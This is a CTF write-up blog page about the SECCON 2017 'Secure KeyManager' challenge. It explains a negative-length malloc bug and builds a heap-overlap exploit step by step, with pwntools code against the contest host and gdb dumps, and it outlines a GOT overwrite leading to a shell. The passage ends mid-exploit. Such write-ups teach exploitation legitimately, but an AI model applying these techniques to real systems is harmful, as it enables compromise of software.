@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SECCON 2017 Online CTF - Secure KeyManager | kileak</title>
+
+
+
+
+
+<meta name="description" content="SECCON 2017 Online CTF - Secure KeyManager">
+
+
+<meta name="keywords" content="seccon">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/SECCON2017-secure_keymanager/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SECCON 2017 Online CTF - Secure KeyManager</h1>
+      <p class="post-meta">Dec 9, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Secure KeyManager (36 solves) (400 points)
+<!--break--></p>
+
+  <p>I have developed a very very secure key manager!
+The key should never leak.
+Have a secure day :)</p>
+
+  <p>Host : secure_keymanager.pwn.seccon.jp
+Port : 47225</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/securekeymanager/secure_keymanager.zip">secure_keymanager.zip (pw: seccon2017)</a> <a href="https://kileak.github.io/assets/securekeymanager/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> _____                            _   __          ___  ___                                  
+/  ___|                          | | / /          |  \/  |                                  
+\ `--.  ___  ___ _   _ _ __ ___  | |/ /  ___ _   _| .  . | __ _ _ __   __ _  __ _  ___ _ __ 
+ `--. \/ _ \/ __| | | | '__/ _ \ |    \ / _ \ | | | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '__|
+/\__/ /  __/ (__| |_| | | |  __/ | |\  \  __/ |_| | |  | | (_| | | | | (_| | (_| |  __/ |   
+\____/ \___|\___|\__,_|_|  \___| \_| \_/\___|\__, \_|  |_/\__,_|_| |_|\__,_|\__, |\___|_|   
+                                              __/ |                          __/ |          
+                                             |___/                          |___/           
+
+Set Your Account Name &gt;&gt; AAAA
+Set Your Master Pass &gt;&gt; BBBB
+
+1. add
+2. show
+3. edit
+4. remove
+9. change master pass
+0. exit
+&gt;&gt; </code></pre></figure>
+
+<p>SecureKeyManager will let you create/edit/remove keys. The show method doesn’t really help much, since it only shows the count of created keys, but not their content.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">show_key</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"id : Title / Key"</span><span class="p">);</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>    
+    <span class="k">if</span> <span class="p">(</span> <span class="n">key_map</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"%02d : ***SECRET*** / ***SECRET***</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>So, let’s take a look at the remaining functions before getting into the exploit.</p>
+
+<p>The key itself will contain 32 characters for a <code class="language-plaintext highlighter-rouge">Title</code> and the rest of the allocated chunk will be used for the <code class="language-plaintext highlighter-rouge">Key</code>. For readabilitys sake, we’ll use this pseudo struct.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Key</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">Title</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">Key</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The add method will allocate the space needed to store the key, and ask for a title and the key itself.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">add_key</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="kt">int</span> <span class="n">idx_key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span> <span class="n">idx_key</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="n">key_map</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]</span> <span class="p">)</span>
+    <span class="n">idx_key</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">idx_key</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"can't add key any more..."</span><span class="p">);</span>    
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"ADD KEY"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input key length..."</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">key_length</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
+
+  <span class="c1">// No checking for negative length here...</span>
+  <span class="n">Key</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">Key</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">key_length</span> <span class="o">+</span> <span class="mi">32</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">key</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"can not allocate..."</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input title..."</span><span class="p">);</span>
+  <span class="n">getnline</span><span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">Title</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input key..."</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">);</span>
+  <span class="n">getnline</span><span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">Key</span><span class="p">,</span> <span class="n">key_length</span><span class="p">);</span>
+
+  <span class="n">key_list</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>  
+  <span class="n">key_map</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">idx_free_key</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>It fails on validating our input for key length. We can enter a negative length, forcing <code class="language-plaintext highlighter-rouge">malloc</code> into allocating a chunk with size <code class="language-plaintext highlighter-rouge">0</code>, which will mean doom for the binary later on. Also the allocated space doesn’t gets initialized, so we might reuse the containing data or overwrite existing data with the <code class="language-plaintext highlighter-rouge">Title</code> or <code class="language-plaintext highlighter-rouge">Key</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">edit_key</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"EDIT KEY"</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">check_account</span><span class="p">())</span>    <span class="c1">// Ask for user/pass</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Input id to edit..."</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">idx_key</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">idx_key</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx_key</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">key_map</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Input new key..."</span><span class="p">);</span>
+        <span class="n">usable_size</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">key_list</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]);</span>
+
+        <span class="k">return</span> <span class="n">getnline</span><span class="p">(</span><span class="n">key_list</span><span class="p">[</span><span class="n">idx_key</span><span class="p">]</span> <span class="o">+</span> <span class="mi">32</span><span class="p">,</span> <span class="n">usable_size</span> <span class="o">-</span> <span class="mi">32</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"not exits..."</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"out of length"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Nothing special here. Since it checks for <code class="language-plaintext highlighter-rouge">malloc_usable_size</code> and subtracts the title length here, we won’t be able to write a key, if the chunk doesn’t provides enough space for it. But we could use this, if we’re able to create a chunk in a somehow more interesting place to overwrite data.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">remove_key</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"REMOVE KEY"</span><span class="p">);</span>  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">check_account</span><span class="p">()</span> <span class="p">)</span>        <span class="c1">// Check for user/pass</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Input id to remove..."</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">key_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">key_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+        <span class="n">key_map</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="k">return</span> <span class="n">idx</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+        <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"not exits..."</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"out of length"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The remove function frees the allocated space, but doesn’t clear the <code class="language-plaintext highlighter-rouge">key_list</code> entry for it. It does indeed zero out the corresponding byte in <code class="language-plaintext highlighter-rouge">key_map</code>, which is used to validate, if a key is in use or not.</p>
+
+<p>The main vulnerability in this binary for me was the fact, that the entered length for the key doesn’t get validated, thus allowing us to pass a size of <code class="language-plaintext highlighter-rouge">0</code> to <code class="language-plaintext highlighter-rouge">malloc</code> by specifying a key length of <code class="language-plaintext highlighter-rouge">-32</code>. This will force <code class="language-plaintext highlighter-rouge">malloc</code> into allocating a chunk with the minimum size of <code class="language-plaintext highlighter-rouge">0x21</code>.</p>
+
+<p>So, let’s see, what could possibly go wrong in the <code class="language-plaintext highlighter-rouge">add_key</code> method by doing this.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">&gt;&gt; 1
+
+ADD KEY
+Input key length...-32</code></pre></figure>
+
+<p>Since <code class="language-plaintext highlighter-rouge">add_key</code> now adds 32 to it, for reserving space for the <code class="language-plaintext highlighter-rouge">Title</code>, this will result in <code class="language-plaintext highlighter-rouge">malloc (0)</code>. The reserved chunk will look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk
+0x603010:   0x0000000000000000  0x0000000000000000
+0x603020:   0x0000000000000000  0x0000000000020fe1  &lt;== Top
+0x603030:   0x0000000000000000  0x0000000000000000
+0x603040:   0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>There are only 24 bytes available for our chunk, so what happens when we now enter the allowed 30 bytes (getnline decreases the input size, to make sure we don’t enter too much here ;))</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Input title...Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk
+0x603010:   0x6141316141306141  0x4134614133614132  
+0x603020:   0x3761413661413561  0x0000396141386141  &lt;== Top (corrupted)
+0x603030:   0x0000000000000000  0x0000000000000000
+0x603040:   0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>So, we’re able to overwrite the chunk size of the following chunk. This is good enough to make this binary stall badly :)</p>
+
+<p>Our attack plan for this will be</p>
+
+<ul>
+  <li>Corrupt the chunks on the heap to create an overlapping freed chunk</li>
+  <li>Force malloc into giving us a chunk overlapping the <code class="language-plaintext highlighter-rouge">key table</code> in the bss</li>
+  <li>Specify a fake chunk in the <code class="language-plaintext highlighter-rouge">got</code> table, letting us overwrite the <code class="language-plaintext highlighter-rouge">got</code> entries</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">printf</code></li>
+  <li>Leak everything</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">system</code></li>
+  <li>Enjoy shell</li>
+</ul>
+
+<p>Quick setup for communicating with the service:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"secure_keymanager.pwn.seccon.jp"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">47225</span>
+
+<span class="n">ACCOUNT</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span>       <span class="c1"># Fake chunksize for later ;-)
+</span><span class="n">PASS</span> <span class="o">=</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="k">def</span> <span class="nf">add_key</span><span class="p">(</span><span class="nb">len</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="n">title</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">!=</span> <span class="s">""</span><span class="p">):</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">remove_key</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">ACCOUNT</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">ACCOUNT</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./secure_keymanager"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./secure_keymanager"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="s">"./libc-2.23.so"</span><span class="p">})</span>
+        <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>This will do the <code class="language-plaintext highlighter-rouge">login</code> for the binary and it will also prepare a fake chunk size in the login credentials <code class="language-plaintext highlighter-rouge">0x71</code>, which we’ll be using later to overwrite all the stuff in the <code class="language-plaintext highlighter-rouge">bss</code>.</p>
+
+<p>After login, the <code class="language-plaintext highlighter-rouge">bss</code> part will look like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ x/30gx 0x6020c0
+0x6020c0 &lt;account&gt;:     0x4141414141414141  0x0000000000000071 &lt;== Account name + fake chunk size 
+0x6020d0:               0x0000000000000000  0x0000000000000000
+0x6020e0 &lt;key_list&gt;:    0x0000000000000000  0x0000000000000000 &lt;== Key array
+0x6020f0 &lt;key_list+16&gt;: 0x0000000000000000  0x0000000000000000
+0x602100 &lt;key_list+32&gt;: 0x0000000000000000  0x0000000000000000
+0x602110 &lt;key_list+48&gt;: 0x0000000000000000  0x0000000000000000
+0x602120 &lt;key_map&gt;:     0x0000000000000000  0x0000000000000000 &lt;== Key map (keys in use)
+0x602130 &lt;master&gt;:      0x4242424242424242  0x0000000000000000 &lt;== Account password</code></pre></figure>
+
+<p>Now, let’s forge the heap for our needs.</p>
+
+<p>We’ll create a chunk with size 0x0 first. Then two fastbin chunks and a blocker chunk to avoid consolidation on free (the blocker chunk isn’t really needed, but makes it easier to understand and explain, what’s happening on the heap. It would also work without the blocker chunk, but we would be taking chunks from the top chunk then instead of unsorted bin list).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create initial chunks (fastbins + blocker chunk)"</span><span class="p">)</span>
+<span class="n">add_key</span><span class="p">(</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>                           <span class="c1"># Malformed chunk
+</span><span class="n">add_key</span><span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span><span class="p">,</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">30</span><span class="p">,</span> <span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">-</span> <span class="mi">2</span><span class="p">))</span>   
+<span class="n">add_key</span><span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span><span class="p">,</span> <span class="s">"D"</span> <span class="o">*</span> <span class="mi">30</span><span class="p">,</span> <span class="s">"E"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="mi">32</span> <span class="o">-</span> <span class="mi">2</span><span class="p">))</span>
+<span class="n">add_key</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s">"BLOCKER"</span><span class="p">,</span> <span class="s">"F"</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span></code></pre></figure>
+
+<p>This produces the following heap structure</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/60gx 0x603000
+0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk 1 (evil one)
+0x603010:   0x4141414141414141  0x0000000000000000
+0x603020:   0x0000000000000000  0x0000000000000071  &lt;== Chunk 2 
+0x603030:   0x4242424242424242  0x4242424242424242              \
+0x603040:   0x4242424242424242  0x0000424242424242               |
+0x603050:   0x4343434343434343  0x4343434343434343               |
+0x603060:   0x4343434343434343  0x4343434343434343               |  (Chunk 2)
+0x603070:   0x4343434343434343  0x4343434343434343               |
+0x603080:   0x4343434343434343  0x4343434343434343               |
+0x603090:   0x0000000000004343  0x0000000000000071  &lt;== Chunk 3 /
+0x6030a0:   0x4444444444444444  0x4444444444444444              \
+0x6030b0:   0x4444444444444444  0x0000444444444444               |
+0x6030c0:   0x4545454545454545  0x4545454545454545               |
+0x6030d0:   0x4545454545454545  0x4545454545454545               |  (Chunk 3)
+0x6030e0:   0x4545454545454545  0x4545454545454545               |
+0x6030f0:   0x4545454545454545  0x4545454545454545               |
+0x603100:   0x0000000000004545  0x00000000000001c1  &lt;== Chunk 4  /</code></pre></figure>
+
+<p>Now, we’ll just remove our first chunk, which will place it into the fastbin list and recreate it. <code class="language-plaintext highlighter-rouge">malloc</code> will see the chunk in the fastbin list and serves it again to reuse it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">log.info("Recreate first chunk and overwrite second chunk metadat")
+remove_key(0)
+
+add_key(-32, "A" * 24 + p8(0xe1), "")</code></pre></figure>
+
+<p>With this, we’ll overwrite the size of Chunk 2 with <code class="language-plaintext highlighter-rouge">0xe1</code>, tricking <code class="language-plaintext highlighter-rouge">malloc</code> into thinking, this chunk would contain all the data between <code class="language-plaintext highlighter-rouge">0x603030</code> and <code class="language-plaintext highlighter-rouge">0x603100</code>. The size must be forged this way, that it creates a valid chunk (this is fulfilled here, since it takes up the space between chunk 2 start and Chunk4 start)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk 1
+0x603010:   0x4141414141414141  0x4141414141414141
+0x603020:   0x4141414141414141  0x00000000000000e1  &lt;== Chunk 2 \
+0x603030:   0x4242424242424242  0x4242424242424242               |
+0x603040:   0x4242424242424242  0x0000424242424242               |
+0x603050:   0x4343434343434343  0x4343434343434343               |
+0x603060:   0x4343434343434343  0x4343434343434343               |
+0x603070:   0x4343434343434343  0x4343434343434343               |
+0x603080:   0x4343434343434343  0x4343434343434343               |
+0x603090:   0x0000000000004343  0x0000000000000071  &lt;== Chunk 3  |
+0x6030a0:   0x4444444444444444  0x4444444444444444             \ |
+0x6030b0:   0x4444444444444444  0x0000444444444444              ||
+0x6030c0:   0x4545454545454545  0x4545454545454545              ||
+0x6030d0:   0x4545454545454545  0x4545454545454545              ||
+0x6030e0:   0x4545454545454545  0x4545454545454545              ||
+0x6030f0:   0x4545454545454545  0x4545454545454545              ||
+0x603100:   0x0000000000004545  0x00000000000001c1  &lt;== Chunk 4 //</code></pre></figure>
+
+<p>When we now <code class="language-plaintext highlighter-rouge">free</code> chunk 2, it will see the chunk size of <code class="language-plaintext highlighter-rouge">0xe1</code> and create an overlapping freed chunk in unsorted bin list, just waiting to get served again.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Remove second chunk (creates overlapped freed chunk)"</span><span class="p">)</span>
+<span class="n">remove_key</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$3 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x6032c0, 
+  last_remainder = 0x0, 
+  bins = {0x603020, 0x603020, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;,          &lt;== Chunk 2 
+    0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 
+    0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;, </code></pre></figure>
+
+<p>Now, we’ll free chunk 3 also. Since it has size <code class="language-plaintext highlighter-rouge">0x71</code>, it will be put into fastbin list, letting bin list untouched.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Remove third chunk (put to fastbin list)"</span><span class="p">)</span>
+<span class="n">remove_key</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/100gx 0x603000
+0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk 1 (allocated)
